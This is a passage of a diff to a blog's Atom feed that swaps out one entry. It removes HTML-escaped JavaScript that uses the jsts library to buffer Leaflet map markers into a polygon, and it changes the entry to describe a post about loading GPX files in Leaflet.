-            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;jsts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;geom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Coordinate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;lat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;lng&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;jsts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;geom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Coordinate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
-    &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;toLeafletPoint&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
-    &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;meters&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//the user can selected the width of the generated polygon&lt;/span&gt;
-    &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;distance&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;meters&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;0.0001&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;111.12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//Geometry aproximations&lt;/span&gt;
-    &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;geometryFactory&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;jsts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;geom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;GeometryFactory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-    &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;pathCoords&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;points&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;pointToGeomCoordinate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
-    &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;shell&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;geometryFactory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createLineString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pathCoords&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-    &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;polygon&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;distance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-    &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;polygonCoords&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;polygon&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getCoordinates&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;polygonCoords&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;coord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;toLeafletPoint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;coord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;This method converts the leaflet points into a format the jsts libray can understand and perform the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;buffer&lt;/code&gt; operation in jsts which does all the magic. From the API definition: buffer computes a buffer area around this geometry having the given width.&lt;/p&gt;
-
-&lt;p&gt;Later the coordinates are transformed into the leaflet format.&lt;/p&gt;
-
-&lt;p&gt;Here you can see it in action: &lt;a href=&quot;https://www.agalera.eu/leaflet-fogofwar/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.agalera.eu/leaflet-fogofwar/&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><category term="leaflet" /><category term="javascript" /><category term="browser" /><category term="gis" /><category term="leaflet" /><category term="javascript" /><category term="browser" /><category term="gis" /><summary type="html">Following up from the previous article about implementing the fog of war in leaflet, I want to add some markers to the map and to create a polygon that joins them. Let’s see how I manage to do that.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://www.agalera.eu/assets/img/posts/draw-polygon-markers/featured-image.jpg" /><media:content medium="image" url="https://www.agalera.eu/assets/img/posts/draw-polygon-markers/featured-image.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
+&lt;p&gt;Here you can see it in action: &lt;a href=&quot;https://www.agalera.eu/leaflet-fogofwar/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.agalera.eu/leaflet-fogofwar/&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><category term="leaflet" /><category term="javascript" /><category term="browser" /><category term="gis" /><category term="gpx" /><category term="leaflet" /><category term="javascript" /><category term="browser" /><category term="gis" /><category term="gpx" /><summary type="html">Following up from the previous article about implementing the fog of war in leaflet, I want to be able to load a GPX file and display it in the map.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://www.agalera.eu/assets/img/posts/leaflet-load-gpx/featured-image.jpg" /><media:content medium="image" url="https://www.agalera.eu/assets/img/posts/leaflet-load-gpx/featured-image.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
